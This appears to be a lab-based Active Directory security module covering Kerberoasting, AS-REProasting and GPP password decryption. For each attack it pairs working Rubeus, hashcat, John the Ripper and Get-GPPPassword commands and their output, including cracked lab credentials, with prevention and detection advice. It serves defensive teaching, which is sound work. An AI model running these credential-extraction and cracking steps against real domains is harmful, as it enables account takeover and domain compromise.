Active Directory (AD) is a directory service for Windows enterprise environments that Microsoft officially released in 2000 with Windows Server 2000. Microsoft has been incrementally improving AD with the release of each new server OS version. Based on the protocols x.500 and LDAP that came before it (which are still utilized in some form today), AD is a distributed, hierarchical structure that allows centralized management of an organization's resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides authentication, accounting, and authorization functionalities within a Windows enterprise environment. It also allows administrators to manage permissions and access to network resources.

Active Directory is so widespread that it is by a margin the most utilized Identity and Access management (IAM) solution worldwide. For this reason, the vast majority of enterprise applications seamlessly integrate and operate with Active Directory. Active Directory is the most critical service in any enterprise. A compromise of an Active Directory environment means unrestricted access to all its systems and data, violating its CIA (Confidentiality, Integrity, and Availability). Researchers constantly discover and disclose vulnerabilities in AD. Via these vulnerabilities, threat actors can utilize malware known as ransomware to hold an organization's data hostage for ransom by performing cryptographic operations (encryption) on it, therefore rendering it useless until they either pay a fee to purchase a decryption key (not advised) or obtain the decryption key with the help of IT Security professionals. However, if we think back, an Active Directory compromise means the compromise of all and any applications, systems, and data instead of a single system or service.

Let's look at publicly disclosed vulnerabilities for the past three years (2020 to 2022). Microsoft has over 3000, and around 9000 since 1999, which signifies an incredible growth of research and vulnerabilities in the past years. The most apparent practice to keep Active Directory secure is ensuring that proper Patch Management is in place, as patch management is currently posing challenges to organizations worldwide. For this module, we will assume that Patch Management is done right (Proper Patch Management is crucial for the ability to withstand a compromise) and focus on other attacks and vulnerabilities we can encounter. We will focus on showcasing attacks that abuse common misconfigurations and Active Directory features, especially ones that are very common/familiar yet incredibly hard to eliminate. Additionally, the protections discussed here aim to arm us for the future, helping us create proper cyber hygiene. If you are thinking Defence in depth, Network segmentation, and the like, then you are on the right track.

If this is your first time learning about Active Directory or hearing these terms, check out the Intro to Active Directory module for a more in-depth look at the structure and function of AD, AD objects, etc. And also Active Directory - Enumeration and Attacks for strengthening your knowledge and gaining an overview of some common attacks.

### Refresher

To ensure we are familiar with the basic concepts, let's review a quick refresher of the terms.

A **domain** is a group of objects that share the same AD database, such as users or devices.

A **tree** is one or more domains grouped. Think of this as the domains test.local, staging.test.local, and preprod.test.local, which will be in the same tree under test.local. Multiple trees can exist in this notation.

A **forest** is a group of multiple trees. This is the topmost level, which is composed of all domains.

**Organizational Units (OU)** are Active Directory containers containing user groups, Computers, and other OUs.

**Trust** can be defined as access between resources to gain permission/access to resources in another domain.

**Domain Controller** is (generally) the Admin of the Active Directory used to set up the entire Directory. The role of the Domain Controller is to provide Authentication and Authorization to different services and users. In Active Directory, the Domain Controller has the topmost priority and has the most authority/privileges.

Active Directory Data Store contains Database files and processes that store and manages directory information for users, services, and applications. Active Directory Data Store contains the file NTDS.DIT, the most critical file within an AD environment; domain controllers store it in the %SystemRoot%\NTDS folder.


A regular AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to:

- Domain Computers
- Domain Users
- Domain Group Information
- Default Domain Policy
- Domain Functional Levels
- Password Policy
- Group Policy Objects (GPOs)
- Kerberos Delegation
- Domain Trusts
- Access Control Lists (ACLs)

Although the settings of AD allow this default behavior to be modified/disallowed, its implications can result in a complete breakdown of applications, services, and Active Directory itself.

LDAP is a protocol that systems in the network environment use to communicate with Active Directory. Domain Controller(s) run LDAP and constantly listen for requests from the network.


**Authentication in Windows Environments:**

- Username/Password, stored or transmitted as password hashes (LM, NTLM, NetNTLMv1/NetNTLMv2).
- Kerberos tickets (Microsoft's implementation of the Kerberos protocol). Kerberos acts as a trusted third party, working with a domain controller (DC) to authenticate clients trying to access services. The - 
- Kerberos authentication workflow revolves around tickets that serve as cryptographic proof of identity that clients exchange between each other, services, and the DC.
- Authentication over LDAP. Authentication is allowed via the traditional username/password or user or computer certificates.

**Key Distribution Center (KDC):** a Kerberos service installed on a DC that creates tickets. Components of the KDC are the authentication server (AS) and the ticket-granting server (TGS).

**Kerberos Tickets are tokens that serve as proof of identity (created by the KDC):**

- TGT is proof that the client submitted valid user information to the KDC.
- TGS is created for each service the client (with a valid TGT) wants to access.

KDC key is an encryption key that proves the TGT is valid. AD creates the KDC key from the hashed password of the KRBTGT account, the first account created in an AD domain. Although it is a disabled user, KRBTGT has the vital purpose of storing secrets that are randomly generated keys in the form of password hashes. One may never know what the actual password value represents (even if we try to configure it to a known value, AD will automatically override it to a random one).

Each domain contains the groups Domain admins and Administrators, the most privileged groups in broad access. By default, AD adds members of Domain admins to be Administrators on all Domain joined machines and therefore grants the rights to log on to them. While the 'Administrators' group of the domain can only log on to Domain Controllers by default, they can manage any Active Directory object (e.g., all servers and therefore assign themselves the rights to log on to them). The topmost domain in a forest also contains an object, the group Enterprise Admins, which has permissions over all domains in the forest.

Default groups in Active Directory are heavily privileged and carry a hidden risk. For example, consider the group Account Operators. When asking AD admins what the reason is to assign it to users/super users, they will respond that it makes the work of the 'Service Desk' easier as then they can reset user passwords. Instead of creating a new group and delegating that specific right to the Organizational Units containing user accounts, they violate the principle of least privilege and endanger all users. Subsequently, this will include an escalation path from Account Operators to Domain Admins, the most common one being through the 'MSOL_' user accounts that Azure AD Connect creates upon installation. These accounts are placed in the default 'Users' container, where 'Account operators' can modify the user objects.

It is essential to highlight that Windows has multiple logon types: ' how' users log on to a machine, which can be, for example, interactive while a user is physically present on a device or remotely over RDP. Logon types are essential to know about because they will leave a 'trace' behind on the system(s) accessed. This trace is the username and password used. As a rule of thumb, logon types except 'Network logon, type 3' leave credentials on the system authenticated and connected to. Microsoft provides a complete list of logon types here.

To interact with Active Directory, which lives on Domain Controllers, we must speak its language, LDAP. Any query happens by sending a specifically crafted message in LDAP to a Domain Controller, such as obtaining user information and a group's membership. Early in its life, Microsoft realized that LDAP is not a 'pretty' language, and they released Graphical tools that can present data in a friendly interface and convert 'mouse clicks' into LDAP queries. Microsoft developed the Remote Server Administration Tools (RSAT), enabling the ability to interact with Active Directory locally on the Domain Controller or remotely from another computer object. The most popular tools are Active Directory Users and Computers (which allows for accessible viewing/moving/editing/creating objects such as users, groups, and computers) and Group Management Policy (which allows for the creation and modification of Group policies).

**Important network ports in any Windows environment include (memorizing them is hugely beneficial):**

- 53: DNS.
- 88: Kerberos.
- 135: WMI/RPC.
- 137-139 & 445: SMB.
- 389 & 636: LDAP.
- 3389: RDP
- 5985 & 5896: PowerShell Remoting (WinRM)

### Real-world view
Every organization, which has (attempted) at some point to increase its maturity, has gone through exercises that classify its systems. The classification defines the importance of each system to the business, such as ERP, CRM, and backups. A business relies on this to successfully meet its objectives and is significantly different from one organization to another. In Active Directory, any additional roles, services, and features that get 'added' on top of what comes out of the box must be classified. This classification is necessary to ensure that we set the bar for which service, if compromised, poses an escalation risk toward the rest of Active Directory. In this design view, we need to ensure that any service allowing for direct (or indirect) escalation is treated similarly as if it was a Domain Controller/Active Directory. Active Directory is massive, complex, and feature-heavy - potential escalation risks are under every rock. Active Directory will provide services such as DNS, PKI, and Endpoint Configuration Manager in an enterprise organization. If an attacker were to obtain administrative rights to these services, they would indirectly have means to escalate their privileges to those of an Administrator of the entire forest. We will demonstrate this through some attack paths described later in the module.

Active Directory has limitations, however. Unfortunately, these limitations are a 'weak' point and expand our attack surface - some born by complexity, others by design, and some due to legacy and backward compatibility. For the sake of completeness, below are three examples of each:

1. **Complexity -** The simplest example is figuring out nested group members. It is easy to get lost when looking into who is a member of a group, a member of another group, and a member of yet another group. While you may think this chain ends eventually, many environments have every 'Domain user' indirectly a member of 'Domain Admins'.
2. **Design -** Active Directory allows managing machines remotely via Group Policy Objects (GPOs). AD stores GPOs in a unique network share/folder called SYSVOL, where all domain-joined devices pull settings applied to them. Because it is a network-shared folder, clients access SYSVOL via the SMB protocol and transfer stored information. Thus, for a machine to use new settings, it has to call a Domain Controller and pull settings from SYSVOL - this is a systematic process, which by default occurs every 90 minutes. Every device must have a Domain Controller 'in sight' to pull this data from. The downside of this is that the SMB protocol also allows for code execution (a remote command shell, where commands will be executed on the Domain Controller), so as long as we have a set of valid credentials, we can consistently execute code over SMB on the Domain Controllers remotely. This port/protocol is available to all machines toward Domain Controllers. (Additionally, SMB is not well fit (generally Active Directory) for the zero-trust concepts.) If an attacker has a good set of privileged credentials, they can execute code as that account on Domain Controllers over SMB (at least!).
3. **Legacy -** Windows is made with a primary focus: it works out of the box for most of Microsoft's customers. Windows is not secure by default. A legacy example is that Windows ships with the broadcasting - DNS-like protocols NetBIOS and LLMNR enabled by default. These protocols are meant to be used if DNS fails. However, they are active even when it does not. However, due to their design, they broadcast user credentials on the wire (usernames, passwords, password hashes), which can effectively provide privileged credentials to anyone listening on the wire by simply being there. This blog post demonstrates the abuse of capturing credentials on the wire.

## Kerberoasting - ATTACKS & DEFENSE

**Description**
In Active Directory, a Service Principal Name (SPN) is a unique service instance identifier. Kerberos uses SPNs for authentication to associate a service instance with a service logon account, which allows a client application to request that the service authenticate an account even if the client does not have the account name. When a Kerberos TGS service ticket is asked for, it gets encrypted with the service account's NTLM password hash.

Kerberoasting is a post-exploitation attack that attempts to exploit this behavior by obtaining a ticket and performing offline password cracking to open the ticket. If the ticket opens, then the candidate password that opened the ticket is the service account's password. The success of this attack depends on the strength of the service account's password. Another factor that has some impact is the encryption algorithm used when the ticket is created, with the likely options being:

- AES
- RC4
- DES (found in environments that are 15+ old years old with legacy apps from the early 2000s, otherwise, this will be disabled)
There is a significant difference in the cracking speed between these three, as AES is slower to crack than the others. While security best practices recommend disabling RC4 (and DES, if enabled for some reason), most environments do not. The caveat is that not all application vendors have migrated to support AES (most but not all). By default, the ticket created by the KDC will be one with the most robust/highest encryption algorithm supported. However, attackers can force a downgrade back to RC4.

**Attack path** 
To obtain crackable tickets, we can use Rubeus. When we run the tool with the kerberoast action without specifying a user, it will extract tickets for every user that has an SPN registered (this can easily be in the hundreds in large environments):

```
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : eagle.local
[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 12.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt


[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 13.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\spn.txt
PS C:\Users\bob\Downloads>
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/cb59d209-6313-40bc-a7ce-d31d6851380c)

We then need to move the extracted file with the tickets to the Kali Linux VM for cracking (we will only focus on the one for the account Administrator, even though Rubeus extracted two tickets).

We can use hashcat with the hash-mode (option -m) 13100 for a Kerberoastable TGS. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to a file called cracked.txt:
```
$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"

hashcat (v6.2.5) starting

<SNIP>

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$eagle.local$http/pki1@ea...42bb2c
Time.Started.....: Tue Dec 13 10:40:10 2022, (0 secs)
Time.Estimated...: Tue Dec 13 10:40:10 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   143.1 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> brady
Hardware.Mon.#1..: Util: 26%

Started: Tue Dec 13 10:39:35 2022
Stopped: Tue Dec 13 10:40:11 2022
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/507c7709-4e5b-4571-82bc-b36f91555628)

(If hashcat gives an error, we may need to pass --force as an argument at the end of the command.)

Once hashcat finishes cracking, we can read the file 'cracked.txt' to see the password Slavi123 in plain text:

```
$ cat cracked.txt

$krb5tgs$23$*Administrator$eagle.local$http/pki1@eagle.local*$ab67a0447d7db2945a28d19802d0da64$b6a6a8d3fa2e9e6b47dac1448ade064b5e9d7e04eb4adb5d97a3ef5fd35c8a5c3b9488f09a98b5b8baeaca48483df287495a31a59ccb07209c84e175eef91dc5e4ceb9f7865584ca906965d4bff757bee3658c3e3f38b94f7e1465cd7745d0d84ff3bb67fe370a07cb7f5f350aa26c3f292ee1d7bc31b97db7543182a950c4458ee45f1ff58d1c03b713d11a559f797b85f575aabb72de974cf48c80cbbc78db245c496d3f78c50de655e6572627904753fe223148bc32063c6f032ecdcb901012a98c029de2676905aff97024c89c9d62a73b5f4a614dfd37b90a30a3335326c61b27e788619f84dc0993661be9a9d631d8e4d89d70023b27e5756a23c374f1a59ed15dbe28147296fae252a6d55d663d61759d6ee002b4d3814ada1cafb8997ed594f1cfab6cdb503058b73e192228257d834fd420e9dbc5c12cfffb2077aa5f2abef8cac07ee6cdc7630be71ed174ee167ea0d95df14f48e3e576aa4f90b23d44378d4533cbad945b830bf59f2814ff2dec8832561c3c67bd43afebb231d8f16b1f218dfda803619a47ac833330dde29b34eb73a4aba7da93d7664b92534e44beb80b5ad22a5f80d72f5c476f1796d041ade455eee50651d746db75490bd9a7165b2638c79973fc03c63a67e2659e3057fbe2bce22175116a3892e95a418a02908e0daea3293dc01cd172b524217efe56d842cf8b6f369f30657cd40fe482467d4f2a3a7f3c1caf52cf5f2afc7454fb934a0fb13a0da76dbcefecc32da3a719cd37f944ea13589ce373163d56eb5e8c2dc3fb567b1c5959b7e4e3e054ea9a5561776bed7c2d9eb3107645efce5d22a033891758ac57b187a19006abdbe3f5d53edfc09e5359bc52538afef759c37fbe00cc46e4968ec69072761c2c796bd8e924521cc6c3a50fc1db09e5ce1d443ff3962ca1878904a8252d4f827bcb1e6d6c38bf1fd8ccc21d70751008ece94699aa3caa7e671cb48afc8eb3ecbf181c6e0ed52f740f07e87025c28e4fd832192a66bc390923ea397527264fe382056be78d791f80d0343bbf60ffd09dce061825595f69b939eaa517dc89f4527094bda0ae6febb03d8af3fb3e527e8b5501bbd807ed23ed9bcf85b74be699bd42a284318c42d90dbbd4df332d654529b23a5d81bedec69dba2f3e308d7f8db058377055c15b9eae6275f60a7ec1d52077546caa2b78cf798769a0096d590bb5d5d5173a67a32c2eba174e067a9bf8b4e1f190f8816bf2d6741a8bd6e4e1a6e7ca5ac745061a93cde0ab03ee8cf1de80afa0674a4248d38efdc77aca269e2388c43c83a3919ef80e9a9f0005b1b40026fc29e6262091cbc4f062cf95d5d7e051c019cd0bd5e85b8dcb16b17fd92820e1e1581265a4472c3a5d1f42bb2c:Slavi123
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/41f9205d-0543-4a0b-af96-5675fa647469)

Alternatively, the captured TGS hashes can be cracked with John The Ripper:

```
┌─[eu-academy-2]─[10.10.15.245]─[htb-ac-594497@htb-mw2xldpqoq]─[~]
└──╼ [★]$ sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Node numbers 1-4 of 4 (fork)
Slavi123         (?)
Slavi123         (?)
```
### Prevention
The success of this attack depends on the strength of the service account's password. While we should limit the number of accounts with SPNs and disable those no longer used/needed, we must ensure they have strong passwords. For any service that supports it, the password should be 100+ random characters (127 being the maximum allowed in AD), which ensures that cracking the password is practically impossible.

There is also what is known as Group Managed Service Accounts (GMSA), which is a particular type of a service account that Active Directory automatically manages; this is a perfect solution because these accounts are bound to a specific server, and no user can use them anywhere else. Additionally, Active Directory automatically rotates the password of these accounts to a random 127 characters value. There is a caveat: not all applications support these accounts, as they work mainly with Microsoft services (such as IIS and SQL) and a few other apps that have made integration possible. However, we should utilize them everywhere possible and start enforcing their use for new services that support them to out phase current accounts eventually.

When in doubt, do not assign SPNs to accounts that do not need them. Ensure regular clean-up of SPNs set to no longer valid services/servers.

Detection
When a TGS is requested, an event log with ID 4769 is generated. However, AD also generates the same event ID whenever a user attempts to connect to a service, which means that the volume of this event is gigantic, and relying on it alone is virtually impossible to use as a detection method. If we happen to be in an environment where all applications support AES and only AES tickets are generated, then it would be an excellent indicator to alert on event ID 4769. If the ticket options is set for RC4, that is, if RC4 tickets are generated in the AD environment (which is not the default configuration), then we should alert and follow up on it. Here is what was logged when we requested the ticket to perform this attack:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/dc408b30-b35b-431f-b2e5-4b58aae0e998)

Even though the general volume of this event is quite heavy, we still can alert against the default option on many tools. When we run 'Rubeus', it will extract a ticket for each user in the environment with an SPN registered; this allows us to alert if anyone generates more than ten tickets within a minute (for example, but it could be less than ten). This event ID should be grouped by the user requesting the tickets and the machine the requests originated from. Ideally, we need to aim to create two separate rules that alert both. In our playground environment, there are two users with SPNs, so when we executed Rubeus, AD generated the following events:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/21496b54-b518-4c3b-b0bc-9e405e4ba4e5)

### Honeypot

A honeypot user is a perfect detection option to configure in an AD environment; this must be a user with no real use/need in the environment, so no service tickets are generated regularly. In this case, any attempt to generate a service ticket for this account is likely malicious and worth inspecting. There are a few things to ensure when using this account:

- The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
- The password should not have been changed recently. A good target is 2+ years, ideally five or more. But the password must be strong enough that the threat agents cannot crack it.
- The account must have some privileges assigned to it; otherwise, obtaining a ticket for it won't be of interest (assuming that an advanced adversary obtains tickets only for interesting accounts/higher likelihood of cracking, e.g., due to an old password).
- The account must have an SPN registered, which appears legit. IIS and SQL accounts are good options because they are prevalent.

An added benefit to honeypot users is that any activity with this account, whether successful or failed logon attempts, is suspicious and should be alerted.

If we go back to our playground environment and configure the user svc-iam (probably an old IAM account leftover) with the recommendations above, then any request to obtain a TGS for that account should be alerted on:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b49f9cfd-ef0f-4894-aad1-ff80f7074d52)

> [!WARNING]
> Be Careful!

Although we give examples of honeypot detections in many of the attacks described, it does not mean an AD environment should implement every single one. That would make it evident to a threat actor that the AD administrator(s) have set many traps. We must consider all the detections and enforce the ones that work best for our AD environment.

## AS-REProasting
### Description
The AS-REProasting attack is similar to the Kerberoasting attack; we can obtain crackable hashes for user accounts that have the property Do not require Kerberos preauthentication enabled. The success of this attack depends on the strength of the user account password that we will crack.

### Attack
To obtain crackable hashes, we can use Rubeus again. However, this time, we will use the asreproast action. If we don't specify a name, Rubeus will extract hashes for each user that has Kerberos preauthentication not required:

```
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: AS-REP roasting

[*] Target Domain          : eagle.local

[*] Searching path 'LDAP://DC2.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : anni
[*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC2.eagle.local (172.16.18.4)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\asrep.txt
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c791c555-2b33-461b-9744-7877178399d8)

nce Rubeus obtains the hash for the user Anni (the only one in the playground environment with preauthentication not required), we will move the output text file to a linux attacking machine.

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$:

```
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
```
Once Rubeus obtains the hash for the user Anni (the only one in the playground environment with preauthentication not required), we will move the output text file to a linux attacking machine.

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$:

```
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
```
We can now use hashcat with the hash-mode (option -m) 18200 for AS-REPRoastable hashes. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to the file asrepcracked.txt:

```
[!bash!]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force

hashcat (v6.2.5) starting

<SNIP>

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$anni@eagle.local:1b912b858c4551c0013d...3d2550
Time.Started.....: Thu Dec 8 06:08:47 2022, (0 secs)
Time.Estimated...: Thu Dec 8 06:08:47 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   130.2 kH/s (0.65ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> brady
Hardware.Mon.#1..: Util: 26%

Started: Thu Dec 8 06:08:11 2022
Stopped: Thu Dec 8 06:08:49 2022
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6a8632e3-7253-4539-9046-9a6ae2592e55)

Once hashcat cracks the password, we can print the contents of the output file to obtain the cleartext password Slavi123:

```
[!bash!]$ sudo cat asrepcrack.txt

$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123
```
## Prevention againts AS-REProasting

As mentioned before, the success of this attack depends on the strength of the password of users with Do not require Kerberos preauthentication configured.

First and foremost, we should only use this property if needed; a good practice is to review accounts quarterly to ensure that we have not assigned this property. Because this property is often found with some regular user accounts, they tend to have easier-to-crack passwords than service accounts with SPNs (those from Kerberoast). Therefore, for users requiring this configured, we should assign a separate password policy, which requires at least 20 characters to thwart cracking attempts.

## Detection againts AS-REProasting
When we executed Rubeus, an Event with ID 4768 was generated, signaling that a Kerberos Authentication ticket was generated:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/04020924-e4a0-4db8-983a-7714aff8fc1d)

The caveat is that AD generates this event for every user that authenticates with Kerberos to any device; therefore, the presence of this event is very abundant. However, it is possible to know where the user authenticated from, which we can then use to correlate known good logins against potential malicious hash extractions. It may be hard to inspect specific IP addresses, especially if a user moves around office locations. However, it is possible to scrutinize the particular VLAN and alert on anything outside it.

### Honeypot

For this attack, a honeypot user is an excellent detection option to configure in AD environments; this must be a user with no real use/need in the environment, such that no login attempts are performed regularly. Therefore, any attempt(s) to perform a login for this account is likely malicious and requires inspection.

However, suppose the honeypot user is the only account with Kerberos Pre-Authentication not required. In that case, there might be better detection methods, as it would be very obvious for advanced threat actors that it is a honeypot user, resulting in them avoiding interactions with it. (I did previously hear from an organization that needed one of these accounts (application related) that the 'security through obscurity' behind having only one of these accounts may save them, as attackers will avoid going after it thinking it is a honeypot user. While it may be true in some instances, we should not let a glimpse of hope dictate the security state of the environment.)

**To make a good honeypot user, we should ensure the following:**

- The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
- For a service account user, the password should ideally be over two years old. For regular users, maintain the password so it does not become older than one year.
The account must have logins after the day the password was changed; otherwise, it becomes self-evident if the last password change day is the same as the previous login.
- The account must have some privileges assigned to it; otherwise, it won't be interesting to try to crack its password's hash.
If we go back to our playground environment and configure the user 'svc-iam' (presumably an old IAM account leftover) with the recommendations above, then any request to obtain a TGT for that account should be alerted on. The event received would look like this:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/01344f0b-690f-4d05-9d53-88d7f6e5062b)


## GPP Passwords

**Description **
SYSVOL is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. AD stores all group policies in \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\. When Microsoft released it with the Windows Server 2008, Group Policy Preferences (GPP) introduced the ability to store and use credentials in several scenarios, all of which AD stores in the policies directory in SYSVOL.

During engagements, we might encounter scheduled tasks and scripts executed under a particular user and contain the username and an encrypted version of the password in XML policy files. The encryption key that AD uses to encrypt the XML policy files (the same for all Active Directory environments) was released on Microsoft Docs, allowing anyone to decrypt credentials stored in the policy files. Anyone can decrypt the credentials because the SYSVOL folder is accessible to all 'Authenticated Users' in the domain, which includes users and computers. Microsoft published the AES private key on MSDN:

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f742b7dd-41bb-404a-ac8c-02620ab2ceca)

Also, as a reference, this is what an example XML file containing an encrypted password looks like (note that the property is called cpassword):
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/20ed495f-93a1-487f-b0b8-e8149c8c7275)

### Attack 
To abuse GPP Passwords, we will use the Get-GPPPassword function from PowerSploit, which automatically parses all XML files in the Policies folder in SYSVOL, picking up those with the cpassword property and decrypting them once detected:

**Link to Get-GPPPassword.ps1 : https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1**

```
PS C:\Users\bob\Downloads> Import-Module .\Get-GPPPassword.ps1
PS C:\Users\bob\Downloads> Get-GPPPassword

UserName  : svc-iis
NewName   : [BLANK]
Password  : abcd@123
Changed   : [BLANK]
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\
            Machine\Preferences\Groups\Groups.xml
NodeName  : Groups
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80
```
